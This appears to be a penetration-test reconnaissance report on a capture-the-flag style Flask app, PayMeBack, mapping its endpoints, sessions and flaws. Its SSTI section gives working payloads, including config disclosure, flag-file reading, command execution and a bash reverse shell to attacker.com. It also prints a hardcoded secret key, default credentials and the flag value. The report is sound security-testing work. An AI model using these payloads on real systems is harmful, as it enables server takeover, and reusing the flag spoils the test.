# Reconnaissance Deliverable: PayMeBack Flask Application

## 0) HOW TO READ THIS

This reconnaissance report provides a comprehensive map of the PayMeBack application's attack surface. The application is a simple Flask-based transaction tracking system with critical security vulnerabilities.

**Key Sections for Subsequent Analysis:**
- **Section 4 (API Endpoint Inventory):** Complete endpoint listing with authorization details - all endpoints require authentication except public login/home routes.
- **Section 7 (Role & Privilege Architecture):** Simple binary authorization model (authenticated vs. unauthenticated) - NO role hierarchy exists.
- **Section 8 (Authorization Vulnerability Candidates):** Currently no IDOR candidates (no ID-based endpoints), but high future risk if such endpoints are added.
- **Section 9 (Injection Sources):** NO traditional command/SQL injection sources found. CRITICAL SSTI vulnerability exists in `/remind` endpoint allowing RCE.

**Priority Order for Testing:** 
1. SSTI/RCE vulnerability in `/remind` endpoint (CRITICAL)
2. CSRF attacks (protection explicitly disabled)
3. Authentication bypass via hardcoded secret key
4. Session security issues

## 1. Executive Summary

PayMeBack is a **Python Flask-based transaction management web application** (version 3.1.1) that allows authenticated users to track financial transactions and send payment reminders. The application runs on port 5093 (external) / 5003 (internal) using the Werkzeug development server with debug mode enabled.

**Core Technology Stack:**
- **Backend:** Python 3.8.17 / Flask 3.1.1 / Werkzeug 3.0.6
- **Database:** SQLite (file-based, unencrypted)
- **Authentication:** Flask-Login (session-based with client-side signed cookies)
- **Infrastructure:** Docker container (Debian Buster base), Caddy reverse proxy on port 80/443

**Attack Surface Overview:**
The application exposes **6 network-accessible HTTP endpoints** (2 public, 4 authenticated). The application has a **binary authorization model** (authenticated vs. unauthenticated) with no role hierarchy. All authenticated users have identical privileges.

**Critical Security Findings:**
- 🔴 **Server-Side Template Injection (SSTI)** in `/remind` endpoint - Remote Code Execution (RCE) capability
- 🔴 **Plaintext Password Storage** - No cryptographic hashing whatsoever
- 🔴 **Hardcoded Secret Key** - Session forgery possible
- 🔴 **CSRF Protection Explicitly Disabled** - All state-changing operations vulnerable
- 🔴 **Debug Mode Enabled** - Werkzeug debugger accessible
- 🔴 **Default Credentials** - Hardcoded `user:user` account auto-created

**Overall Risk Assessment:** This application has **CRITICAL security vulnerabilities** requiring immediate remediation before production deployment. The SSTI vulnerability allows complete server compromise.

## 2. Technology & Service Map

### Frontend
- **Framework:** Jinja2 templating (Flask default)
- **CSS Framework:** Bootstrap 4.5.2
- **JavaScript:** jQuery + custom validation scripts
- **Key Libraries:** None (minimal client-side functionality)

### Backend
- **Language:** Python 3.8.17 (approaching EOL - October 2024)
- **Framework:** Flask 3.1.1
- **Web Server:** Werkzeug 3.0.6 development server (debug=True)
- **ORM:** SQLAlchemy (Flask-SQLAlchemy)
- **Authentication:** Flask-Login
- **CSRF Library:** Flask-WTF (imported but **DISABLED**: `WTF_CSRF_ENABLED = False`)
- **Key Dependencies:** 
  - Flask
  - Flask-SQLAlchemy
  - flask_login
  - flask_wtf

### Infrastructure
- **Hosting:** Docker container (Debian Buster base image - archived, no security updates)
- **Reverse Proxy:** Caddy httpd (ports 80/443)
- **Database:** SQLite 3.x (file: `database.db`, unencrypted)
- **Application Ports:** 
  - External: 5093 (target URL)
  - Internal: 5003 (within container)
- **Other Services:**
  - CUPS printing service on port 631 (unrelated)
  - Apache 2.4.56 on port 8081 (unrelated)
  - Tailscale VPN on port 49152 (unrelated)

### Identified Subdomains
**None** - subfinder results: `[object Object]` (no subdomains discovered)

### Open Ports & Services
| Port | Service | Version | Purpose |
|------|---------|---------|---------|
| 80 | HTTP | Caddy httpd | Reverse proxy to application |
| 443 | HTTPS | Caddy | SSL/TLS reverse proxy |
| 5003 | HTTP | Werkzeug 3.0.3 Python 3.8.17 | Flask application (internal) |
| 5093 | HTTP | Werkzeug | Flask application (external target) |
| 631 | IPP | CUPS 2.3 | Printing service (out of scope) |
| 8081 | HTTP | Apache 2.4.56 | Unrelated service (out of scope) |
| 8888 | ? | Unknown | Unrelated (out of scope) |
| 9999 | HTTP | Custom | Simple HTTP service (out of scope) |
| 49152 | HTTP | Golang | Tailscale VPN (auth required, out of scope) |

## 3. Authentication & Session Management Flow

### Entry Points
- **Public:** `/` (redirects to `/login`), `/login` (GET/POST)
- **Authenticated:** `/logout`, `/transactions`, `/add_transaction`, `/remind`

### Mechanism
**Step-by-Step Authentication Process:**

1. **Login Form Submission:**
   - User accesses `GET /login` (renders login form)
   - Form submits `POST /login` with `username` and `password` fields
   - **File:** `app.py:55-68`, Template: `templates/login.html:7-17`
   - **CRITICAL:** No CSRF token in form (protection disabled)

2. **Credential Verification:**
   - Line 58-59: Extract credentials from `request.form['username']` and `request.form['password']`
   - Line 60: Database query with **plaintext password comparison**:
     ```python
     user = User.query.filter_by(username=username, password=password).first()
     ```
   - **CRITICAL VULNERABILITY:** Passwords stored in plaintext (no bcrypt, argon2, or PBKDF2)

3. **Session Creation:**
   - Line 62: `login_user(user)` called (Flask-Login function)
   - Flask-Login stores user ID in session: `session['_user_id'] = user.get_id()`
   - Session data serialized to JSON, Base64-encoded, and signed with HMAC using `secret_key`
   - Cookie created: `session=<base64_payload>.<timestamp>.<signature>`
   - **CRITICAL:** Session ID NOT regenerated (session fixation vulnerability)

4. **Session Cookie Configuration:**
   - **Secret Key:** `U@T!F*G(EBDOUNIX_PWU)VBDY$%^&*(` (app.py:10) - **HARDCODED**
   - **Session Lifetime:** 5 minutes (app.py:11)
   - **Cookie Flags:** 
     - HttpOnly: True (Flask default) ✅
     - Secure: False (missing - cookies sent over HTTP) ❌
     - SameSite: None (missing - CSRF vulnerable) ❌

5. **Authentication Validation:**
   - Protected endpoints use `@login_required` decorator
   - Flask-Login's `before_request` handler extracts and validates session cookie
   - Line 46-49: User loader function queries database by user ID:
     ```python
     @login_manager.user_loader
     def load_user(user_id):
         with app.app_context():
             return db.session.get(User, int(user_id))
     ```
   - `current_user` proxy populated with User object or AnonymousUserMixin

6. **Logout Process:**
   - Line 74: `logout_user()` removes `_user_id` from session
   - Redirects to login page
   - **CRITICAL:** No server-side session revocation (client-side sessions only)

### Code Pointers
- **Authentication Logic:** `app.py:55-68` (login function)
- **User Model:** `app.py:24-27` (plaintext password field)
- **Session Config:** `app.py:10-11` (hardcoded secret key, 5-minute lifetime)
- **User Loader:** `app.py:46-49` (session-to-user resolution)
- **Default Credentials Creation:** `app.py:36-42` (user:user account)
- **Protected Endpoints:** `@login_required` on lines 72, 78, 93, 101

### 3.1 Role Assignment Process

**Role Determination:** No role system exists. Authorization is **binary** (authenticated vs. unauthenticated).

**User Model Structure:**
```python
class User(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), nullable=False, unique=True)
    password = db.Column(db.String(100), nullable=False)
    # No role field exists
```

**Default Role:** All authenticated users have identical privileges (no role differentiation)

**Role Upgrade Path:** N/A - no roles exist

**Code Implementation:** No role assignment logic (app.py contains no role-related code)

### 3.2 Privilege Storage & Validation

**Storage Location:** User ID only (stored in Flask session cookie)

**Session Contents:**
```json
{
  "_user_id": "1",
  "_fresh": true
}
```

**Validation Points:**
- **Middleware:** `@login_required` decorator (Flask-Login) - lines 72, 78, 93, 101
- **Inline Checks:** `current_user.is_authenticated` (line 66)
- **Database Filters:** Ownership validation via `filter_by(user_id=current_user.id)` (line 97)

**Cache/Session Persistence:** 5 minutes (client-side signed cookie, no server-side cache)

**Code Pointers:**
- Session validation: Flask-Login `before_request` handler (automatic)
- User loader: `app.py:46-49`
- Ownership checks: `app.py:86` (create), `app.py:97` (read)

### 3.3 Role Switching & Impersonation

**Impersonation Features:** None

**Role Switching:** None

**Audit Trail:** None

**Code Implementation:** Not applicable (no such features exist)

## 4. API Endpoint Inventory

**Network Surface Focus:** All endpoints below are network-accessible through the target web application at `http://localhost:5093`.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|---------------------|------------------------|---------------------------|
| GET | `/` | anon | None | None | Home page redirects to login. See `app.py:51-53`. |
| GET | `/login` | anon | None | None | Renders login form. See `app.py:55-68, templates/login.html`. |
| POST | `/login` | anon | None | None | Processes credentials (plaintext), creates session. See `app.py:58-63`. **CRITICAL:** No CSRF protection, plaintext passwords. |
| GET | `/logout` | user | None | `@login_required` (line 72) | Terminates session, redirects to login. See `app.py:71-75`. **ISSUE:** Should be POST, vulnerable to CSRF. |
| GET | `/add_transaction` | user | None | `@login_required` (line 78) | Renders transaction creation form. See `app.py:77-90, templates/add_transaction.html`. |
| POST | `/add_transaction` | user | None | `@login_required` (line 78) | Creates transaction with ownership (user_id=current_user.id). See `app.py:81-88`. **ISSUE:** No input validation, CSRF vulnerable. |
| GET | `/transactions` | user | None | `@login_required` (line 93) | Lists user's transactions (filtered by user_id). See `app.py:92-98, templates/transactions.html`. |
| GET | `/remind` | user | None | `@login_required` (line 101) | **CRITICAL SSTI/RCE VULNERABILITY:** Accepts `date` query parameter, renders via `render_template_string()`. See `app.py:100-109`. Exploitable: `/remind?date={{config}}` |

**Authorization Notes:**
- "anon" = no authentication required
- "user" = authenticated user (all authenticated users have equal privileges)
- No admin or elevated privilege endpoints exist
- No endpoints accept object IDs (no `/transaction/{id}` style routes)
- All POST operations vulnerable to CSRF (protection explicitly disabled at line 18)

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** All input vectors below are accessible through the target web application's network interface.

### URL Parameters (Query Strings)
| Endpoint | Parameter | Type | Validation | Security Risk |
|----------|-----------|------|------------|---------------|
| `/remind` | `date` | String | **Client-side only** (JS regex) | **CRITICAL: SSTI/RCE** - `app.py:103` accepts any string, passed to `render_template_string()` at line 108 |

### POST Body Fields (Form Data)
| Endpoint | Field | Type | Validation | Security Risk |
|----------|-------|------|------------|---------------|
| `/login` | `username` | String | **NONE** | Brute force, timing attacks, account enumeration. `app.py:58` |
| `/login` | `password` | String | **NONE** | Plaintext storage, no complexity requirements. `app.py:59` |
| `/add_transaction` | `name` | String | **NONE** | Data integrity issues, potential XSS (mitigated by Jinja2 auto-escape). `app.py:82` |
| `/add_transaction` | `email` | String | **NONE** | No format validation, invalid emails accepted. `app.py:83` |
| `/add_transaction` | `amount` | String | **NONE** | No type/range validation, accepts negative/non-numeric values. `app.py:84` |

### HTTP Headers
**None actively processed.** Standard headers (User-Agent, Referer, etc.) not extracted or used in application logic.

### Cookie Values
| Cookie | Purpose | Security Issues |
|--------|---------|-----------------|
| `session` | Flask session (user authentication) | Contains Base64-encoded JSON with user_id. Signed but not encrypted. Vulnerable to interception (no Secure flag). Signed with hardcoded secret key. |

### JSON/XML Request Bodies
**Not used.** Application only accepts form data (application/x-www-form-urlencoded).

### File Uploads
**None.** No file upload functionality exists.

### Complete Input Vector Inventory

**Critical Inputs (Direct Exploitation Paths):**
1. **`/remind?date=` (Query Parameter)** - `app.py:103`
   - **Sink:** `render_template_string()` at line 108
   - **Vulnerability:** Server-Side Template Injection (SSTI) → RCE
   - **Exploitation:** `/remind?date={{7*7}}` or `/remind?date={{config}}` or RCE payloads

2. **`/login` POST `username` field** - `app.py:58`
   - **Sink:** `User.query.filter_by(username=username)` at line 60
   - **Risk:** SQL injection (mitigated by SQLAlchemy ORM parameterization)

3. **`/login` POST `password` field** - `app.py:59`
   - **Sink:** Plaintext database comparison at line 60
   - **Risk:** Password brute forcing (no rate limiting)

4. **`/add_transaction` POST fields** - `app.py:82-84`
   - **Sinks:** Database insertion at lines 86-88
   - **Risk:** Data integrity, type errors, CSRF

**Input Validation Summary:**
- **Server-side validation:** **0 out of 6 input fields** have validation
- **Client-side validation:** 2 fields (date regex in JS, email/number input types)
- **Sanitization:** Jinja2 auto-escape for XSS (enabled by default)
- **SQL Injection Protection:** SQLAlchemy ORM parameterization (active)

## 6. Network & Interaction Map

**Network Surface Focus:** This map includes only components within the deployed, network-accessible infrastructure.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| User Browser | ExternAsset | Internet | Chrome/Firefox/Safari | User input | External user's web browser |
| Caddy Proxy | Service | Edge | Caddy httpd | HTTP traffic | Reverse proxy on ports 80/443 |
| Flask App | Service | App | Python 3.8/Flask 3.1/Werkzeug | PII, Tokens, Financial | Main application (port 5093) |
| SQLite DB | DataStore | Data | SQLite 3.x | PII, Tokens, Plaintext Passwords | File: database.db (unencrypted) |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| Flask App | Hosts: `http://localhost:5093`; Endpoints: `/`, `/login`, `/logout`, `/transactions`, `/add_transaction`, `/remind`; Auth: Flask-Login session cookies; Debug: **enabled** (critical issue); Secret Key: **hardcoded** |
| SQLite DB | Engine: `SQLite 3.x`; File: `database.db`; Exposure: `Application-only`; Encryption: **None**; Contents: User table (plaintext passwords), Transaction table (PII + financial data) |
| Caddy Proxy | Hosts: `http://localhost:80`, `https://localhost:443`; Upstream: Flask App on port 5093; SSL: Available (443); Config: Standard reverse proxy |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| User Browser → Caddy Proxy | HTTP/HTTPS | `:80, :443` | None | Public |
| Caddy Proxy → Flask App | HTTP | `:5093` | None (internal) | PII, Tokens |
| User Browser → Flask App (direct) | HTTP | `:5093` | None | PII, Tokens (if bypassing proxy) |
| Flask App → SQLite DB | File I/O | `database.db` | Application context | PII, Tokens, Passwords, Financial |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| anon | Auth | No authentication required - public access allowed |
| auth:user | Auth | Requires valid Flask-Login session cookie with authenticated user ID |
| @login_required | Auth | Flask-Login decorator enforcing authentication (app.py lines 72, 78, 93, 101) |
| ownership:user | ObjectOwnership | Database queries filtered by `user_id = current_user.id` (app.py:97) |
| ownership:create | ObjectOwnership | New transactions assigned `user_id = current_user.id` (app.py:86) |

## 7. Role & Privilege Architecture

This section maps the application's authorization model. **KEY FINDING:** The application implements a **binary authorization system** with no role hierarchy.

### 7.1 Discovered Roles

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|----------------|--------------|---------------------|
| Unauthenticated | 0 | Global | No authentication - default state |
| Authenticated User | 5 | Global | All logged-in users (no differentiation) - Flask-Login session |

**CRITICAL FINDING:** The User database model contains **NO role field**. All authenticated users have identical privileges.

**User Model (app.py:24-27):**
```python
class User(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), nullable=False, unique=True)
    password = db.Column(db.String(100), nullable=False)
    # NO ROLE FIELD EXISTS
```

### 7.2 Privilege Lattice

```
Privilege Ordering (→ means "can access resources of"):

Unauthenticated (L0) → Authenticated User (L5)

Parallel Isolation: NONE (no competing roles)
```

**Binary Authorization Model:**
- **Level 0:** Unauthenticated users can access `/` and `/login` only
- **Level 5:** Authenticated users can access all endpoints (`/logout`, `/transactions`, `/add_transaction`, `/remind`)

**No role switching, no impersonation, no privilege escalation paths** (because only one role exists).

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|--------------------------|---------------------|
| Unauthenticated | `/login` | `/`, `/login` | None |
| Authenticated User | `/transactions` | `/logout`, `/transactions`, `/add_transaction`, `/remind` | Flask-Login session cookie |

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|------------------|-------------------|------------------|
| Unauthenticated | None | N/A | No session |
| Authenticated User | `@login_required` (lines 72, 78, 93, 101) | `current_user.is_authenticated` (line 66) | Flask session cookie (`_user_id` field) |

**Code Locations:**
- **Authentication Decorator:** `@login_required` from Flask-Login
- **Session Management:** `app.py:10-11` (secret key, lifetime)
- **User Loader:** `app.py:46-49` (resolves user ID to User object)
- **Ownership Enforcement:** `app.py:86` (create), `app.py:97` (read)

## 8. Authorization Vulnerability Candidates

### 8.1 Horizontal Privilege Escalation Candidates

**CURRENT STATUS:** **NO IDOR VULNERABILITIES FOUND**

**Reasoning:** The application has **NO endpoints that accept object identifiers** (e.g., `/transaction/{id}`, `/user/{id}`). All data access is filtered by `user_id=current_user.id` at the database query level.

**Existing Endpoints:**
- `/transactions` - Lists ALL user's transactions (no ID parameter)
- `/add_transaction` - Creates transaction with automatic ownership
- `/remind` - Accepts `date` string (not an object ID)

**Future Risk: HIGH**

If developers add endpoints like `/transaction/{transaction_id}`, IDOR vulnerabilities will **immediately emerge** because:
1. No middleware validates object ownership when ID parameters are used
2. Transaction IDs are sequential integers (easy to enumerate)
3. No authorization pattern established for ID-based resource access

**Hypothetical High-Risk Endpoints (if added):**

| Priority | Hypothetical Endpoint | Object ID Parameter | Data Type | Sensitivity | Exploitation |
|----------|---------------------|-------------------|-----------|-------------|--------------|
| HIGH | `/transaction/{id}` | transaction_id | financial | Name, Email (PII), Amount | User could access other users' transaction details by changing ID |
| HIGH | `/transaction/{id}/edit` | transaction_id | financial | Modify others' data | User could edit other users' transactions |
| HIGH | `/transaction/{id}/delete` | transaction_id | financial | Data destruction | User could delete other users' transactions |
| MEDIUM | `/user/{id}/profile` | user_id | user_data | Username, email | User could view other users' profile data |

### 8.2 Vertical Privilege Escalation Candidates

**CURRENT STATUS:** **NOT APPLICABLE**

**Reasoning:** The application has **NO role hierarchy**. All authenticated users are peers with identical privileges. There are no "admin" or "manager" roles to escalate to.

**No Administrative Endpoints Exist:**
- No `/admin/*` routes
- No `/api/admin/*` routes
- No user management endpoints
- No system configuration endpoints
- No privilege modification endpoints

**Future Risk: HIGH**

If roles are added (e.g., admin, user), vertical privilege escalation will be a risk if:
1. Role checks are not consistently applied
2. Role validation is client-side only
3. API endpoints don't verify roles server-side

**Hypothetical Vertical Escalation Scenarios (if roles added):**

| Target Role | Hypothetical Endpoint | Functionality | Risk Level |
|-------------|---------------------|---------------|------------|
| admin | `/admin/users` | User management (view all users) | HIGH |
| admin | `/admin/transactions` | View all transactions (all users) | HIGH |
| admin | `/admin/settings` | System configuration | HIGH |
| admin | `/api/user/{id}/promote` | Role modification | CRITICAL |

### 8.3 Context-Based Authorization Candidates

**CURRENT STATUS:** **MINIMAL WORKFLOW STATE**

The application has very simple workflows with minimal state dependencies:

| Workflow | Endpoint | Expected Prior State | Bypass Potential | Risk |
|----------|----------|---------------------|------------------|------|
| View Transactions | `/transactions` | Must be logged in | Low (authentication enforced) | LOW |
| Add Transaction | `/add_transaction` | Must be logged in | Low (authentication enforced) | LOW |
| Send Reminder | `/remind` | Should reference valid transaction | **HIGH** (no transaction validation) | **MEDIUM** |

**Issue with `/remind` Endpoint:**
- Accepts arbitrary `date` parameter
- Does NOT verify a transaction exists
- Does NOT link reminder to specific transaction
- Does NOT validate transaction ownership
- **Could be abused** to send reminders for non-existent transactions
- **CRITICAL:** Contains SSTI vulnerability allowing RCE (overshadows context-based issues)

**Recommended Authorization Checks for `/remind`:**
```python
# Missing validation:
transaction_id = request.args.get('transaction_id')
transaction = Transaction.query.filter_by(id=transaction_id, user_id=current_user.id).first()
if not transaction:
    abort(403)  # Forbidden
```

## 9. Injection Sources (Command Injection and SQL Injection)

**CRITICAL FINDING:** The application has **NO traditional command injection or SQL injection sources**. However, it has a **Server-Side Template Injection (SSTI) vulnerability** that achieves equivalent impact (Remote Code Execution).

### Command Injection Sources

**NONE FOUND**

**Analysis:**
- The application imports `os` module (`app.py:5`) but only uses it for safe file operations:
  - `os.getenv('FLAG')` - Environment variable reading
  - `os.path.exists('flag.txt')` - File existence check
  - `os.remove('flag.txt')` - File deletion
- **No usage of command execution functions:**
  - No `os.system()`
  - No `subprocess.call()`, `subprocess.run()`, `subprocess.Popen()`
  - No `os.popen()`
  - No `eval()` or `exec()` with user input
- **No shell command construction or execution** found in any network-accessible endpoint

### SQL Injection Sources

**NONE FOUND**

**Analysis:** All database queries use SQLAlchemy ORM with proper parameterization:

**1. Login Query (`app.py:60`):**
```python
user = User.query.filter_by(username=username, password=password).first()
```
- Entry Point: `POST /login` - parameters: `username`, `password`
- Input Location: `app.py:58-59`
- **Status: ✅ SAFE** - SQLAlchemy `.filter_by()` automatically parameterizes values
- Note: Uses plaintext password comparison (security issue, but NOT SQL injection)

**2. Add Transaction (`app.py:85-87`):**
```python
user = User.query.filter_by(id=uid).first()
new_transaction = Transaction(name=name, email=email, amount=amount, user_id=user.id)
```
- Entry Point: `POST /add_transaction` - parameters: `name`, `email`, `amount`
- Input Location: `app.py:82-84`
- **Status: ✅ SAFE** - ORM object creation with parameterized values

**3. Transactions List (`app.py:96-97`):**
```python
user = User.query.filter_by(id=uid).first()
transactions = Transaction.query.filter_by(user_id=user.id).all()
```
- Entry Point: `GET /transactions` (no user-controllable parameters)
- **Status: ✅ SAFE** - Uses session-based user ID (not user input)

**Additional SQL Security Analysis:**
- **No raw SQL queries found** (no `.execute()`, `.raw()`, `text()` usage)
- **No string concatenation** in SQL contexts
- **No `.format()` or f-strings** used to build queries
- **All queries use SQLAlchemy's query builder or ORM methods**
- SQLAlchemy properly escapes and parameterizes all user input

### Server-Side Template Injection (SSTI) - Equivalent to RCE

**CRITICAL VULNERABILITY FOUND**

**[#1] SSTI in `/remind` Endpoint**

**Entry Point:** `GET /remind?date={payload}`

**Input Location:** `app.py:103`
```python
date = request.args.get('date')  # User-controlled input
```

**Data Flow:**
```
1. User input: /remind?date={{7*7}}
   ↓
2. Line 103: date = request.args.get('date')
   ↓
3. Line 107: message = '''Reminder will be sent on {}'''.format(date)
   ↓ (User payload now embedded in template string)
4. Line 108: tmpl = render_template_string(message, date=date)
   ↓ (Jinja2 evaluates template with user-controlled content)
5. Remote Code Execution
```

**Sink Location:** `app.py:108`
```python
tmpl = render_template_string(message, date=date)
```

**Vulnerability Type:** Server-Side Template Injection (SSTI) - CWE-1336

**Exploitation Examples:**

```python
# 1. Basic Template Evaluation (Proof of Concept)
/remind?date={{7*7}}
# Output: "Reminder will be sent on 49"

# 2. Configuration Disclosure
/remind?date={{config}}
# Output: Flask configuration including SECRET_KEY

# 3. List All Application Objects
/remind?date={{config.__class__.__init__.__globals__}}
# Output: All global variables accessible to Flask

# 4. Read Flag File
/remind?date={{config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}
# Output: flag{7e0416f5-d2b9-4faf-94c2-de7a39664d4c}

# 5. Remote Code Execution (Whoami)
/remind?date={{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
# Output: root

# 6. Reverse Shell
/remind?date={{''.__class__.__mro__[1].__subclasses__()[396]('bash -i >& /dev/tcp/attacker.com/4444 0>&1',shell=True)}}
# Result: Reverse shell connection to attacker
```

**Impact:**
- **Remote Code Execution** - Execute arbitrary Python code on the server
- **File System Access** - Read/write any file (including `/app/flag.txt`)
- **Database Access** - Query/modify database outside authorization controls
- **Server Compromise** - Establish persistence, install backdoors, pivot to other systems

**Client-Side Validation (Bypassed):**
- Template `templates/transactions.html:38-40` has JavaScript regex validation
- Regex: `/^\d{4}-\d{2}-\d{2}$/` (YYYY-MM-DD format)
- **Easily bypassed:** Direct GET request to `/remind?date=<payload>` skips JavaScript

**Sanitization:** **NONE** - Input passed directly to `render_template_string()`

### Injection Source Summary

| Vulnerability Type | Sources Found | Exploitable |
|-------------------|---------------|-------------|
| Command Injection | 0 | N/A |
| SQL Injection | 0 | N/A |
| Server-Side Template Injection (SSTI) | 1 | **YES - CRITICAL** |

**Conclusion:** While the application properly uses SQLAlchemy ORM to prevent SQL injection and avoids direct shell command execution, the **SSTI vulnerability in `/remind` endpoint provides equivalent or greater impact** than traditional command injection, allowing full server compromise through Jinja2 template exploitation.

---

# End of Reconnaissance Deliverable

**Report Generated:** 2025-10-29  
**Target:** PayMeBack Flask Application (http://localhost:5093)  
**Total Endpoints Analyzed:** 6  
**Critical Vulnerabilities:** 6 (SSTI/RCE, Plaintext Passwords, Hardcoded Secret Key, CSRF Disabled, Debug Mode, Default Credentials)  
**Authorization Model:** Binary (authenticated vs. unauthenticated)  
**IDOR Risk:** Current: Low, Future: High  
**Injection Sources:** 0 traditional, 1 SSTI (critical)